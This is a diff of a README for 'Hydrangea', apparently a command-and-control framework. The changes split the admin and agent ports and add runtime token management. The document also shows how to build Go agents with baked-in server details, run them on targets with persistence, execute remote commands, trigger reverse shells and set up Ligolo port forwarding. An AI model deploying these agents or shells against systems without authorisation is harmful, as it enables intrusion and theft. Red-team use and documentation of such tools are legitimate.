@@ -95,8 +95,12 @@ This installs the `hydrangea` package and its dependencies (`rich`, `prompt_tool
 
 ### 2 — Start the server
 
+The server uses two distinct port types:
+- **`--admin-port`** — accepts controller connections only, authenticated with `--admin-token`
+- **`--ports`** — accepts agent/beacon connections, authenticated with `--agent-token`
+
 ```bash
-# Separate admin and agent ports, single agent token
+# Minimal: separate admin and agent ports, single agent token
 poetry run hydrangea-server \
   --admin-port 9000 --ports 9001 \
   --admin-token admin-secret --agent-token beacon-token
@@ -106,6 +110,11 @@ poetry run hydrangea-server \
   --admin-port 9000 --ports 9001 9002 --storage ./loot \
   --admin-token admin-secret \
   --agent-token team-a --agent-token team-b
+
+# No agent tokens at startup — add them at runtime via the controller
+poetry run hydrangea-server \
+  --admin-port 9000 --ports 9001 \
+  --admin-token admin-secret
 
 # With TLS (auto-generates a self-signed cert via openssl)
 poetry run hydrangea-server \
@@ -121,24 +130,23 @@ poetry run hydrangea-server \
 
 The server prints a SHA-256 fingerprint when TLS is enabled — copy it for use with the controller and agents.
 
+> **Note:** The admin port rejects `REGISTER` frames (agent connections) and the agent ports reject `ADMIN` frames (controller connections). Both violations are logged.
+
 ### 3 — Start the controller
 
 ```bash
 # Connect to a local server
-poetry run hydrangea-ctl --port 9000 --auth-token supersecret
+poetry run hydrangea-ctl --port 9000 --auth-token admin-secret
 
 # Connect to a remote server
-poetry run hydrangea-ctl --host 10.0.0.1 --port 9000 --auth-token supersecret
+poetry run hydrangea-ctl --host 10.0.0.1 --port 9000 --auth-token admin-secret
 
 # With TLS + fingerprint pinning
-poetry run hydrangea-ctl --port 9000 --auth-token supersecret \
+poetry run hydrangea-ctl --port 9000 --auth-token admin-secret \
   --tls --tls-fingerprint <hex-from-server>
 
-# Auto-start a server and then open the REPL
-poetry run hydrangea-ctl --port 9000 --auth-token supersecret --start-srv
-
 # UI flags
-poetry run hydrangea-ctl --port 9000 --auth-token supersecret --no-banner --no-color
+poetry run hydrangea-ctl --port 9000 --auth-token admin-secret --no-banner --no-color
 ```
 
 The controller validates connectivity and token before entering the REPL. Once inside:
@@ -153,12 +161,12 @@ The controller validates connectivity and token before entering the REPL. Once i
 **From the controller REPL:**
 
 ```
-hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9000 \
-               --build-auth-token supersecret --client-id target-1 --out ./agents
+hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9001 \
+               --build-auth-token beacon-token --client-id target-1 --out ./agents
 
 # With TLS baked in
-hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9000 \
-               --build-auth-token supersecret --build-tls \
+hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9001 \
+               --build-auth-token beacon-token --build-tls \
                --build-tls-fingerprint <hex> --out ./agents
 ```
 
@@ -173,8 +181,8 @@ go build -o hydrangea-client .
 # With baked-in defaults
 go build \
   -ldflags "-X main.DefaultServerHost=10.0.0.1 \
-            -X main.DefaultServerPort=9000 \
-            -X main.DefaultAuthToken=supersecret \
+            -X main.DefaultServerPort=9001 \
+            -X main.DefaultAuthToken=beacon-token \
             -X main.DefaultClientID=target-1" \
   -o hydrangea-client .
 
@@ -186,17 +194,18 @@ nix build ".#hydrangea-client-windows"
 **Run the agent on the target:**
 
 ```bash
-./hydrangea-client --server 10.0.0.1 --port 9000 --auth-token supersecret --client-id target-1
+# Point the agent at an agent port (not the admin port)
+./hydrangea-client --server 10.0.0.1 --port 9001 --auth-token beacon-token --client-id target-1
 
 # With TLS (fingerprint pins the self-signed cert)
-./hydrangea-client --server 10.0.0.1 --port 9000 --auth-token supersecret \
+./hydrangea-client --server 10.0.0.1 --port 9001 --auth-token beacon-token \
   --tls --tls-fingerprint <hex>
 
 # Additional flags
 ./hydrangea-client ... [--persist] [--debug] [--device-info] [--test-connection]
 ```
 
-> The **auth token** must match across server, controller, and all agents.
+> The agent token must match the token accepted on the target agent port (global or port-exclusive).
 
 ---
 
@@ -232,7 +241,7 @@ Hydrangea exposes a small, explicit surface. Anything not listed here isn't impl
 
 | Command | Description |
 |---|---|
-| `clients` | List all connected agent IDs |
+| `clients` | List all connected agents with their server port, user, hostname, and beacon address |
 | `ping [--client <id>] [--timeout <s>]` | Ping a client and display round-trip time in ms |
 | `session [--client <id>]` | Fetch OS, user, PID, cwd, and runtime info |
 
@@ -249,6 +258,7 @@ Hydrangea exposes a small, explicit surface. Anything not listed here isn't impl
 | Command | Description |
 |---|---|
 | `exec [--client <id>] --command "<cmd>" [--shell] [--cwd <p>] [--timeout <s>]` | Run a command on the agent; returns `rc`, `stdout`, and `stderr`. Pass a JSON list for argv (`["ls","-la"]`) or a plain string. |
+| `server-exec --command "<cmd>" [--timeout <s>]` | Run a shell command directly on the server host; returns `rc`, `stdout`, and `stderr`. |
 | `local <cmd>` | Run a command locally on the controller machine (5-minute timeout). |
 
 ### Advanced
@@ -258,12 +268,35 @@ Hydrangea exposes a small, explicit surface. Anything not listed here isn't impl
 | `reverse-shell [--client <id>] <host:port>` | Tell the agent to connect back with a shell. Start your listener **before** issuing this command. |
 | `port-forward [--client <id>] --ligolo-path <bin> --connect-args "<args>"` | Upload and launch a Ligolo agent for port forwarding. |
 
-### Build & Server
+### Build & Server Management
 
 | Command | Description |
 |---|---|
 | `build-client [options]` | Compile Go agents with baked-in server details. See [Build and deploy a Go agent](#4--build-and-deploy-a-go-agent). |
 | `server-status` | Show server health and recent log entries. |
+| `server-config` | Show the current server port and token configuration (tokens masked). |
+| `add-agent-token --token <t> [--port <p>]` | Register a new agent auth token globally, or bind it exclusively to a specific agent port. |
+| `add-agent-port --port <p> [--token <t>]` | Open a new agent listening port at runtime. Optionally bind an exclusive token to it. |
+| `remove-agent-token --token <t> [--port <p>]` | Remove an agent token from the global set, or from a port's exclusive set. |
+| `remove-agent-port --port <p>` | Close an agent listening port and evict all connected agents on that port. The admin port cannot be removed. |
+
+#### Token scoping
+
+By default all `--agent-token` values form a global set accepted on every agent port. When you bind a token to a specific port via `add-agent-token --port`, that port enters **exclusive mode** — only tokens bound to it are accepted, and the global set is bypassed for that port.
+
+```
+# Global token (accepted on all agent ports that are not in exclusive mode)
+hydrangea ❯  add-agent-token --token team-all
+
+# Port-exclusive token (only this token works on :9002)
+hydrangea ❯  add-agent-token --token team-red --port 9002
+
+# Open a new port with its own exclusive token in one step
+hydrangea ❯  add-agent-port --port 9003 --token team-blue
+
+# Inspect the result
+hydrangea ❯  server-config
+```
 
 ---
 
